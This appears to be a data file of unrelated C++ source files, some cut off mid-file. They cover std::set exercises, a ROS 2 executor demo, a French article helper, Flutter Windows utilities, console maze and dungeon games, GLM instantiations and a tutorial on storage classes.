    "//EXPLICIT TYPE ANNOTATION\n\n//#include <iostream>\n//#include<string>\n//#include<set>\n//using namespace std;\n//int main() {\n    //set<string> books={\n        //\"python\",\n        //\"java\",\n        //\"dart\",\n        //\"c++\"\n    //};\n    //for (string element:books) {\n        //cout<<element<<endl;\n    //}\n    //cout<<endl;\n    //return 0;\n//}\n\n//IMPLICIT TYPE INFERENCE\n\n// #include<iostream>\n// #include<string>\n// using namespace std;\n// int main(){\n//     auto sentence=string(\"hi,welcome to mgis\");\n//     cout<<\"greetings:\"<<sentence<<endl;\n//     return 0;\n//}\n\n//SET OF NUMBERS\n\n// #include <iostream>\n// #include <set>\n// using namespace std;\n// int main() {\n//     set<int> num={\n//         1,2,3,4,5\n//     };\n//     for (int numbers:num) {\n//         cout<<\"the set is : \"<< numbers;\n//     }\n//     return 0;\n// }\n\n//INSERT INTO SET\n\n// #include<iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string>myset={\"nivi\",\"subi\",\"nikhil\",\"devi\",\"ramesh\"};\n//     cout<<\"set elements:\";\n//     for (string element:myset) {\n//         cout<<\" \"<<element;\n//     }\n//     cout<<endl;\n//     myset.insert(\"rithu\");\n//     cout<<\"updated set: \";\n//     for (string element:myset) {\n//         cout<<\" \"<<element;\n//     }\n//     cout<<endl;\n//     return 0;\n// }\n\n\n//REMOVING\n\n// #include<iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//    set<string>myset={\"nivi\",\"subi\",\"nikhil\",\"devi\",\"ramesh\",\"rithu\"};\n//      cout<<\"set elements:\";\n//      for (string element:myset) {\n//          cout<<\" \"<<element;\n//      }\n//      cout<<endl;\n//      myset.erase(\"rithu\");\n//      for (string element:myset) {\n//         cout<<element<<endl;\n//      }\n//      return 0;\n// }\n     \n//CLEAR\n\n// #include <iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string> books={\"python\",\"c++\",\"c\",\"dart\",\"java\"};\n//     cout<<\"original set : \";\n//     for (string element:books) {\n//         cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     books.clear();\n//     cout<<\"set after clearing : \";\n//     for (string element:books) {\n//         cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     return 0;\n// }\n\n//FIND AN ITEM\n\n// #include <iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string> books={\"python\",\"c++\",\"c\",\"dart\",\"java\"};\n//     auto it=books.find(\"dart\");\n//     if (it !=books.end()) {\n//         cout<<\"dart is found\"<<endl;\n//     } else {\n//         cout<<\"dart not found\"<<endl;\n//     }\n//     return 0;\n// }\n\n//REPACEMENT IN SET\n\n// #include <iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string> books={\"python\",\"c++\",\"c\",\"dart\",\"java\"};\n//     cout<<\"original set : \";\n//     for (string element:books) {\n//         cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     books.erase(\"c\");\n//     books.insert(\"pandas\");\n//     cout<<\"set after replacement : \";\n//     for (string element:books) {\n//         cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     return 0;\n// }\n    \n// RESETTING OF SET\n\n// #include <iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string> books={\"python\",\"c++\",\"c\",\"dart\",\"java\"};\n//     cout<<\"original set : \";\n//     for (string element:books) {\n//         cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     books.clear();\n//     cout<<\"set after resetting : \";\n//     for (string element:books) {\n//     cout<<element<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     return 0;\n// }\n\n//SIZE OF SET\n\n// #include <iostream>\n// #include<set>\n// using namespace std;\n// int main() {\n//     set<string> books={\"python\",\"c++\",\"c\",\"dart\",\"java\"};\n//     cout<<\"size of set : \"<<books.size()<<endl<<endl;\n//     return 0;\n// }\n\n//UNION OPERATION\n\n// #include<iostream>\n// #include<unordered_set>\n// using namespace std;\n// int main() {\n//     unordered_set<int> set1={1,2,3,4,5};\n//     unordered_set<int> set2={3,4,5,6,7};\n//     unordered_set<int> unionset;\n//     unionset.insert(set1.begin(),set1.end());\n//     unionset.insert(set2.begin(),set2.end());\n//     cout<<\"union set\";\n//     for (int elem:unionset) {\n//         cout<<elem<<\" \";\n//     }\n//     cout<<endl<<endl;\n//     return 0;\n// }\n\n//DIFFERENCE\n\n// #include<iostream>\n// #include<set>\n// #include<algorithm>\n// using namespace std;\n// int main() {\n//     set<int> set1={1,2,3,4,5};\n//     set<int> set2={3,4,5,6,7};\n//     set<int> difference;\n//     set_difference(set1.begin(),set1.end(),set2.begin(),set2.end(),\n//     inserter(difference,difference.begin()));\n    \n//     cout<<\"difference :\";\n//     for (int value:difference) {\n//         cout<<value<<\" \"; \n//     }\n//     cout<<endl<<endl;\n//     return 0;\n// }\n\n\n\n         \n        \n\n\n",
    "#include \"example_interfaces/srv/add_two_ints.hpp\"\n#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include <sstream>\n\nclass LearnExecutorNode : public rclcpp::Node {\npublic:\n  LearnExecutorNode() : Node(\"learn_executor\") {\n    publisher_ =\n        this->create_publisher<std_msgs::msg::String>(\"string_topic\", 10);\n    timer_ = this->create_wall_timer(\n        std::chrono::seconds(1),\n        std::bind(&LearnExecutorNode::timer_callback, this));\n    service_callback_group_ = this->create_callback_group(\n        rclcpp::CallbackGroupType::MutuallyExclusive);  // \u4e92\u65a5\u56de\u8c03\u7ec4\n    service_ = this->create_service<example_interfaces::srv::AddTwoInts>(\n        \"add_two_ints\",\n        std::bind(&LearnExecutorNode::add_two_ints_callback, this,\n                  std::placeholders::_1, std::placeholders::_2),\n        rmw_qos_profile_services_default, service_callback_group_);\n  }\n\nprivate:\n  void timer_callback() {\n    auto msg = std_msgs::msg::String();\n    msg.data = \"\u8bdd\u9898\u53d1\u5e03\uff1a\" + thread_info();\n    RCLCPP_INFO(this->get_logger(), msg.data.c_str());\n    publisher_->publish(msg);\n  }\n\n  std::string thread_info() {\n    std::ostringstream thread_str;\n    thread_str << \"\u7ebf\u7a0bID\uff1a\" << std::this_thread::get_id();\n    return thread_str.str();\n  }\n\n  void add_two_ints_callback(\n      const std::shared_ptr<example_interfaces::srv::AddTwoInts::Request>\n          request,\n      std::shared_ptr<example_interfaces::srv::AddTwoInts::Response> response) {\n    RCLCPP_INFO(this->get_logger(), \"\u670d\u52a1\u5f00\u59cb\u5904\u7406\uff1a%s\", thread_info().c_str());\n    std::this_thread::sleep_for(std::chrono::seconds(10));\n    response->sum = request->a + request->b;\n    RCLCPP_INFO(this->get_logger(), \"\u670d\u52a1\u5904\u7406\u5b8c\u6210\uff1a%s\", thread_info().c_str());\n  }\n\n  rclcpp::Publisher<std_msgs::msg::String>::SharedPtr publisher_;\n  rclcpp::TimerBase::SharedPtr timer_;\n  rclcpp::Service<example_interfaces::srv::AddTwoInts>::SharedPtr service_;\n  rclcpp::CallbackGroup::SharedPtr service_callback_group_;\n};\n\nint main(int argc, char *argv[]) {\n  rclcpp::init(argc, argv);\n  auto node = std::make_shared<LearnExecutorNode>();\n//   auto executor = rclcpp::executors::SingleThreadedExecutor();\n  auto executor = rclcpp::executors::MultiThreadedExecutor();\n  executor.add_node(node);\n  executor.spin();\n  rclcpp::shutdown();\n  return 0;\n}",
    "#include <iostream>\n#include <iostream>\n#include <string>\n#include <algorithm>\n\nusing namespace std;\n\nstring worldCountry;\n\nint main() {\n  cout << \"-Welcome to the French Country Article Adder v1.0!\\n\" << endl;\n  \n  cout << \"-Simply enter in the name of the country, in French, and we'll take care of adding the correct article!\\n\" << endl;\n\n  cout << \"***Case and Spelling Sensitive***\\n\" << endl;\n\n  cout << \"Enter name of country: \";\n  cin >> worldCountry;\n  cout << \"\\n\";\n\n  if (worldCountry == \"Etats-Unis\" || worldCountry == \"Pays-Bas\") {\n    cout << \"les \" + worldCountry << endl;\n  } \n  else if (worldCountry == \"Belize\" || worldCountry == \"Cambodge\" || worldCountry == \"Mexique\" || worldCountry == \"Mozambique\" || worldCountry == \"Zaire\" || worldCountry == \"Zimbabwe\") {\n    cout << \"le \" + worldCountry << endl;\n  }\n  else if (worldCountry[0] == 'A' || worldCountry[0] == 'E' || worldCountry[0] == 'I' || worldCountry[0] == 'O' || worldCountry[0] == 'U') {\n    cout << \"l'\" + worldCountry << endl;\n  }\n  else if (worldCountry[worldCountry.length() - 1] == 'e') {\n    cout << \"la \" + worldCountry << endl;\n  }\n  else {\n    cout << \"le \" + worldCountry << endl;\n  }\n\n  cout << \"\\n\";\n  \n  return 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n// \u5b9a\u6570\u306e\u5b9a\u7fa9\r\nconst int width = 40;\r\nconst int height = 20;\r\nconst char playerChar = '@';\r\nconst char enemyChar = 'E';\r\nconst char itemChar = 'T';\r\nconst char emptyChar = ' ';\r\nconst char wallChar = '#';\r\nconst int playerSpeed = 1;\r\nconst int enemyCount = 10;\r\n\r\nclass Player {\r\npublic:\r\n    int x, y;\r\n    Player(int startX, int startY) : x(startX), y(startY) {}\r\n\r\n    void moveLeft(const std::vector<std::vector<char>>& maze) {\r\n        if (x > 0 && maze[y][x - 1] != wallChar) x -= playerSpeed;\r\n    }\r\n    void moveRight(const std::vector<std::vector<char>>& maze) {\r\n        if (x < width - 1 && maze[y][x + 1] != wallChar) x += playerSpeed;\r\n    }\r\n    void moveUp(const std::vector<std::vector<char>>& maze) {\r\n        if (y > 0 && maze[y - 1][x] != wallChar) y -= playerSpeed;\r\n    }\r\n    void moveDown(const std::vector<std::vector<char>>& maze) {\r\n        if (y < height - 1 && maze[y + 1][x] != wallChar) y += playerSpeed;\r\n    }\r\n};\r\n\r\nclass Enemy {\r\npublic:\r\n    int x, y;\r\n    Enemy(int startX, int startY) : x(startX), y(startY) {}\r\n\r\n    void moveRandom(const std::vector<std::vector<char>>& maze) {\r\n        int dir = rand() % 4;\r\n        switch (dir) {\r\n        case 0: if (x > 0 && maze[y][x - 1] != wallChar) x--; break;\r\n        case 1: if (x < width - 1 && maze[y][x + 1] != wallChar) x++; break;\r\n        case 2: if (y > 0 && maze[y - 1][x] != wallChar) y--; break;\r\n        case 3: if (y < height - 1 && maze[y + 1][x] != wallChar) y++; break;\r\n        }\r\n    }\r\n};\r\n\r\nclass Game {\r\nprivate:\r\n    Player player;\r\n    std::vector<Enemy> enemies;\r\n    int itemX, itemY;\r\n    bool gameOver;\r\n    HANDLE hConsole;\r\n    std::vector<std::vector<char>> maze; // \u8ff7\u8def\u306e\u30c7\u30fc\u30bf\r\n\r\n    void setup() {\r\n        enemies.clear();\r\n        gameOver = false;\r\n        srand(static_cast<unsigned>(time(0)));\r\n        hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\r\n        // \u30d7\u30ec\u30a4\u30e4\u30fc\u306e\u521d\u671f\u4f4d\u7f6e\r\n        player = Player(1, 1);\r\n\r\n        // \u30a2\u30a4\u30c6\u30e0\u306e\u4f4d\u7f6e\r\n        itemX = width - 2;\r\n        itemY = height - 2;\r\n\r\n        // \u8ff7\u8def\u306e\u751f\u6210\r\n        maze = std::vector<std::vector<char>>(height, std::vector<char>(width, emptyChar));\r\n        for (int y = 0; y < height; ++y) {\r\n            for (int x = 0; x < width; ++x) {\r\n                if (x == 0 || x == width - 1 || y == 0 || y == height - 1) {\r\n                    maze[y][x] = wallChar; // \u5916\u58c1\r\n                }\r\n            }\r\n        }\r\n\r\n        // \u5185\u58c1\u306e\u30e9\u30f3\u30c0\u30e0\u914d\u7f6e\r\n        for (int i = 0; i < width * height / 8; ++i) { // \u5185\u58c1\u306e\u6570\u3092\u8abf\u6574\r\n            int wx = rand() % (width - 2) + 1;\r\n            int wy = rand() % (height - 2) + 1;\r\n            if (maze[wy][wx] == emptyChar && !(wx == 1 && wy == 1) && !(wx == itemX && wy == itemY)) {\r\n                maze[wy][wx] = wallChar;\r\n            }\r\n        }\r\n\r\n        // \u6575\u306e\u914d\u7f6e\r\n        for (int i = 0; i < enemyCount; ++i) {\r\n            int ex, ey;\r\n            do {\r\n                ex = rand() % (width - 2) + 1;\r\n                ey = rand() % (height - 2) + 1;\r\n            } while (maze[ey][ex] == wallChar || (ex == player.x && ey == player.y) || (ex == itemX && ey == itemY));\r\n            enemies.emplace_back(ex, ey);\r\n        }\r\n    }\r\n\r\n    void draw() {\r\n        COORD coord = { 0, 0 };\r\n        SetConsoleCursorPosition(hConsole, coord);\r\n\r\n        for (int y = 0; y < height; ++y) {\r\n            for (int x = 0; x < width; ++x) {\r\n                if (x == player.x && y == player.y) {\r\n                    std::cout << playerChar;\r\n                }\r\n                else if (x == itemX && y == itemY) {\r\n                    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);\r\n                    std::cout << itemChar;\r\n                    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\r\n                }\r\n                else if (maze[y][x] == wallChar) {\r\n                    std::cout << wallChar;\r\n                }\r\n                else {\r\n                    bool printed = false;\r\n                    for (const auto& enemy : enemies) {\r\n                        if (x == enemy.x && y == enemy.y) {\r\n                            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);\r\n                            std::cout << enemyChar;\r\n                            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\r\n                            printed = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!printed) {\r\n                        std::cout << emptyChar;\r\n                    }\r\n                }\r\n            }\r\n            std::cout << \"\\n\";\r\n        }\r\n    }\r\n\r\n    void input() {\r\n        if (_kbhit()) {\r\n            switch (_getch()) {\r\n            case 'a':\r\n                player.moveLeft(maze);\r\n                break;\r\n            case 'd':\r\n                player.moveR",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include \"logic.h\"\r\n\r\nusing std::cout, std::endl, std::ifstream, std::string;\r\n\r\n/**\r\n * TODO: Student implement this function\r\n * Load representation of the dungeon level from file into the 2D map.\r\n * Calls createMap to allocate the 2D array.\r\n * @param   fileName    File name of dungeon level.\r\n * @param   maxRow      Number of rows in the dungeon table (aka height).\r\n * @param   maxCol      Number of columns in the dungeon table (aka width).\r\n * @param   player      Player object by reference to set starting position.\r\n * @return  pointer to 2D dynamic array representation of dungeon map with player's location., or nullptr if loading fails for any reason\r\n * @updates  maxRow, maxCol, player\r\n */\r\nchar** loadLevel(const string& fileName, int& maxRow, int& maxCol, Player& player) {\r\n\r\n    ifstream ifs(fileName);\r\n    if(!ifs.is_open()) {\r\n        cout << \"Open file\" << endl;\r\n        return nullptr;\r\n    }\r\n    char** map;\r\n    int playerRow;\r\n    int playerCol; \r\n\r\n    //Taking inputs for height and width\r\n    ifs >> maxRow;\r\n    if (ifs.fail() || maxRow > 999999 || maxRow <= 0) {\r\n        cout << \"Error fail maxRow\" << endl;\r\n        return nullptr;\r\n    }\r\n    ifs >> maxCol;\r\n    if (ifs.fail() || maxCol > 999999 || maxCol <= 0) {\r\n        cout << \"Error fail maxCol\" << endl;\r\n        return nullptr;\r\n    }\r\n\r\n    //Storing player row and player col\r\n    ifs >> playerRow;\r\n    if (ifs.fail() || playerRow >= maxRow  || playerRow < 0) {\r\n        cout << \"Error fail playerRow\" << endl;\r\n        return nullptr;\r\n    }\r\n    ifs >> playerCol;\r\n    if (ifs.fail() || playerCol >= maxCol || playerCol < 0) {\r\n        cout << \"Error fail playerCol\" << endl;\r\n        return nullptr;\r\n    }\r\n\r\n    //CHecking number of spaces in not greater than INT_32\r\n    if (maxRow > INT32_MAX/maxCol) {\r\n        cout << \"Error fail INT_32\" << endl;\r\n        return nullptr;\r\n    }\r\n\r\n    //Creating the map\r\n    map = createMap(maxRow, maxCol);\r\n\r\n    //Checking if map is created properly\r\n    if (map == nullptr) {\r\n        cout << \"Error fail nullptr\" << endl;\r\n        return nullptr;\r\n    }\r\n\r\n    //Reading in the inputs from the file\r\n    for (int row = 0; row < maxRow; row++) {\r\n        for (int col = 0; col < maxCol; col++) {\r\n            ifs >> map[row][col];\r\n            if (map[row][col] != TILE_OPEN &&\r\n                map[row][col] != TILE_TREASURE && \r\n                map[row][col] != TILE_PILLAR &&\r\n                map[row][col] != TILE_AMULET &&  \r\n                map[row][col] != TILE_DOOR && \r\n                map[row][col] != TILE_EXIT &&\r\n                map[row][col] != TILE_MONSTER) {\r\n                deleteMap(map, maxRow);\r\n                return nullptr;\r\n               }\r\n            if (ifs.fail()) {\r\n                cout << \"Error fail\" << endl;\r\n                deleteMap(map, maxRow);\r\n                return nullptr;\r\n            }\r\n        }\r\n    }\r\n\r\n    //Checking if too many inputs are present\r\n    string whitespace;\r\n    ifs >> whitespace;\r\n\r\n    for (unsigned int i=0; i<whitespace.size(); i++) {\r\n        if (isspace(whitespace.at(i))==0) {\r\n            cout << \"Error fail too big\" << endl;\r\n            deleteMap(map, maxRow);\r\n            return nullptr;\r\n        }\r\n    }\r\n\r\n    if (!ifs.eof()) {\r\n        cout << \"Error fail too big\" << endl;\r\n        deleteMap(map, maxRow);\r\n        return nullptr;\r\n    }\r\n\r\n    bool hasExit = false;\r\n    for (int row = 0; row < maxRow; row++) {\r\n        for (int col = 0; col < maxCol; col++) {\r\n            if (map[row][col] == TILE_EXIT || map[row][col] == TILE_DOOR) {\r\n                hasExit = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    if (!hasExit) {\r\n        deleteMap(map, maxRow);\r\n            return nullptr;\r\n    }\r\n\r\n    //Updating player's position and in the map\r\n    player.col = playerCol;\r\n    player.row = playerRow;\r\n    map[playerRow][playerCol] = TILE_PLAYER;\r\n    return map;\r\n}\r\n\r\n/**\r\n * TODO: Student implement this function\r\n * Translate the character direction input by the user into row or column change.\r\n * That is, updates the nextRow or nextCol according to the player's movement direction.\r\n * @param   input       Character input by the user which translates to a direction.\r\n * @param   nextRow     Player's next row on the dungeon map (up/down).\r\n * @param   nextCol     Player's next column on dungeon map (left/right).\r\n * @updates  nextRow, nextCol\r\n */\r\nvoid getDirection(char input, int& nextRow, int& nextCol) {\r\n    //up movement\r\n    if (input == 'w') {\r\n        nextRow = nextRow - 1;\r\n        return;\r\n    }\r\n\r\n    //down movement\r\n    if (input == 's') {\r\n        nextRow = nextRow + 1;\r\n        return;\r\n    }\r\n\r\n    //right movement\r\n    if (input == 'd') {\r\n        nextCol++;\r\n        return;\r\n    }\r\n\r\n    //left movement\r\n    if (input == 'a') {\r\n        nextCol--;\r\n        return;\r\n    }\r\n}\r\n\r\n/**\r\n * TODO: [suggested] Student implement this function\r\n * Allocate the 2D map a",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, highp>;\ntemplate struct vec<4, int32, high",
    "/*\r\nStorage Classes in C++ with Examples\r\nLast Updated : 18 Aug, 2023\r\nC++ Storage Classes are used to describe the characteristics of a\r\nvariable/function. It determines the lifetime, visibility, default value, and\r\nstorage location which helps us to trace the existence of a particular variable\r\nduring the runtime of a program. Storage class specifiers are used to specify\r\nthe storage class for a variable.\r\nSyntax\r\nTo specify the storage class for a variable, the following syntax is to be\r\nfollowed:\r\nstorage_class var_data_type var_name;\r\nC++ uses 6 storage classes, which are as follows:\r\n1. auto Storage Class\r\n2. register Storage Class\r\n3. extern Storage Class\r\n4. static Storage Class\r\n5. mutable Storage Class\r\n6. thread_local Storage Class\r\n*/\r\n\r\n\r\n/*\r\nBelow is a detailed explanation of each storage class:\r\n\r\n1. auto Storage Class\r\nThe auto storage class is the default class of all the variables declared inside a block. The auto stands for automatic and all the local variables that are declared in a block automatically belong to this class.\r\n\r\nProperties of auto Storage Class Objects\r\nScope: Local\r\nDefault Value: Garbage Value\r\nMemory Location: RAM\r\nLifetime: Till the end of its scope\r\nExample of auto Storage Class\r\nC++\r\n\r\n// C++ Program to illustrate the auto storage class\r\n// variables\r\n#include <iostream>\r\nusing namespace std;\r\n \r\nvoid autoStorageClass()\r\n{\r\n \r\n    cout << \"Demonstrating auto class\\n\";\r\n \r\n    // Declaring an auto variable\r\n    int a = 32;\r\n    float b = 3.2;\r\n    char* c = \"GeeksforGeeks\";\r\n    char d = 'G';\r\n \r\n    // printing the auto variables\r\n    cout << a << \" \\n\";\r\n    cout << b << \" \\n\";\r\n    cout << c << \" \\n\";\r\n    cout << d << \" \\n\";\r\n}\r\n \r\nint main()\r\n{\r\n \r\n    // To demonstrate auto Storage Class\r\n    autoStorageClass();\r\n \r\n    return 0;\r\n}\r\nOutput\r\nDemonstrating auto class\r\n32 \r\n3.2 \r\nGeeksforGeeks \r\nG \r\n\r\nNote: Earlier in C++, we could use the auto keyword to declare the auto variables explicitly but after C++11, the meaning of auto keyword is changed and we could no longer use it to define the auto variables.\r\n\r\n2. extern Storage Class\r\nThe extern storage class simply tells us that the variable is defined elsewhere and not within the same block where it is used (i.e. external linkage). Basically, the value is assigned to it in a different block and this can be overwritten/changed in a different block as well. An extern variable is nothing but a global variable initialized with a legal value where it is declared in order to be used elsewhere.\r\n\r\nA normal global variable can be made extern as well by placing the \u2018extern\u2019 keyword before its declaration/definition in any function/block. The main purpose of using extern variables is that they can be accessed between two different files which are part of a large program.\r\n\r\nProperties of extern Storage Class Objects\r\nScope: Global\r\nDefault Value: Zero\r\nMemory Location: RAM\r\nLifetime: Till the end of the program.\r\nExample of extern Storage Class\r\nC++\r\n\r\n// C++ Program to illustrate the extern storage class\r\n#include <iostream>\r\nusing namespace std;\r\n \r\n// declaring the variable which is to\r\n// be made extern an initial value can\r\n// also be initialized to x\r\nint x;\r\nvoid externStorageClass()\r\n{\r\n \r\n    cout << \"Demonstrating extern class\\n\";\r\n \r\n    // telling the compiler that the variable\r\n    // x is an extern variable and has been\r\n    // defined elsewhere (above the main\r\n    // function)\r\n    extern int x;\r\n \r\n    // printing the extern variables 'x'\r\n    cout << \"Value of the variable 'x'\"\r\n         << \"declared, as extern: \" << x << \"\\n\";\r\n \r\n    // value of extern variable x modified\r\n    x = 2;\r\n \r\n    // printing the modified values of\r\n    // extern variables 'x'\r\n    cout << \"Modified value of the variable 'x'\"\r\n         << \" declared as extern: \\n\"\r\n         << x;\r\n}\r\n \r\nint main()\r\n{\r\n \r\n    // To demonstrate extern Storage Class\r\n    externStorageClass();\r\n \r\n    return 0;\r\n}\r\nOutput\r\nDemonstrating extern class\r\nValue of the variable 'x'declared, as extern: 0\r\nModified value of the variable 'x' declared as 